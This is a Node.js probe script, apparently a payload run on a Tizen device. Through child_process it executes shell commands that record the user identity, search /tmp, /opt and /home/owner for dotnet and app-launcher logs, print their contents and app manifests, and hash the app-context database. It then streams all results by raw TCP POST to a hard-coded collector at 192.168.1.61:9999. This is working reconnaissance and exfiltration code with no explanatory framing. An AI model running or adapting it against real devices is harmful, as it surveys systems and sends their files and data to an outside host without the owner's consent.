"use strict";

/* p102: dotnet-launcher logs + app launch evidence */
var cp = null;
try { cp = require('child_process'); } catch (e) {}

var HOST = '192.168.1.61';
var PORT = 9999;
var R = { ts: new Date().toISOString(), probe: 'p102', results: {}, log: [] };
var posted = false;

function L(s) { R.log.push(String(s).substring(0, 500)); }

function postBuf(path, buf) {
  try {
    var net = require('net');
    var hdr = 'POST ' + path + ' HTTP/1.1\r\nHost: ' + HOST + ':9999\r\nContent-Type: application/octet-stream\r\nContent-Length: ' + buf.length + '\r\nConnection: close\r\n\r\n';
    var s = net.connect(PORT, HOST);
    s.setTimeout(180000, function () { s.destroy(); });
    s.on('connect', function () {
      s.write(hdr);
      var off = 0;
      var iv = setInterval(function () {
        if (off >= buf.length) { clearInterval(iv); setTimeout(function () { s.destroy(); }, 3000); return; }
        s.write(buf.slice(off, off + 65536));
        off += 65536;
      }, 50);
      setTimeout(function () { s.destroy(); }, 300000);
    });
    s.on('error', function (e) { L('postBuf err ' + e.message); });
  } catch (e) { L('postBuf ctor ' + e); }
}

function postFinal() {
  if (posted) return;
  posted = true;
  postBuf('/p102info', new Buffer(JSON.stringify(R), 'utf8'));
}

function run(cmd, timeoutMs, maxLen) {
  maxLen = maxLen || 8000;
  if (!cp) return '[no cp]';
  try {
    var out = cp.execSync(cmd, { timeout: timeoutMs || 25000, maxBuffer: 16 * 1024 * 1024 }).toString().trim();
    return '[exit 0] ' + out.substring(0, maxLen);
  } catch (e) {
    var o = '';
    if (e.stdout) o += e.stdout.toString();
    if (e.stderr) o += (o ? '\n' : '') + e.stderr.toString();
    return '[exit ' + (e.status === undefined ? '?' : e.status) + '] ' + (o || (e && e.message) || 'unknown').substring(0, maxLen);
  }
}

function md5(p) { return run('md5sum ' + p + ' 2>&1; ls -la ' + p + ' 2>&1', 15000, 2000); }

function main() {
  R.results.s0_id = run('id; whoami; groups 2>&1', 10000, 500);
  R.results.find_logs = run('find /tmp /opt /home/owner -maxdepth 4 -type f \\( -name "dotnet*" -o -name "*p13net*" -o -name "*launchp13*" \\) 2>/dev/null | head -40', 30000, 4000);
  R.results.cat_dotnet = run('for f in $(find /tmp /opt /home/owner -maxdepth 4 -type f -name "dotnet*" 2>/dev/null | head -10); do echo "=== $f"; head -40 "$f" 2>&1; done', 30000, 6000);
  R.results.cat_p13 = run('for f in $(find /tmp /opt /home/owner -maxdepth 4 -type f -name "*p13net*" 2>/dev/null | head -10); do echo "=== $f"; head -40 "$f" 2>&1; done', 30000, 6000);
  R.results.app_manifest = run('cat /opt/usr/apps/p13netappx/tizen-manifest.xml 2>&1; echo ===; cat /opt/usr/apps/launchp13x/tizen-manifest.xml 2>&1', 20000, 4000);
  R.results.jrn = md5('/opt/dbspace/.app-context.db-journal');
  R.results.live = md5('/opt/dbspace/.app-context.db');
  R.results.final = 'done ' + new Date().toISOString();
  L('done');
  postFinal();
  setTimeout(postFinal, 20000);
}

try { main(); } catch (e) { R.results.fatal = String(e) + ' | ' + (e.stack || 'no-stack'); postFinal(); }
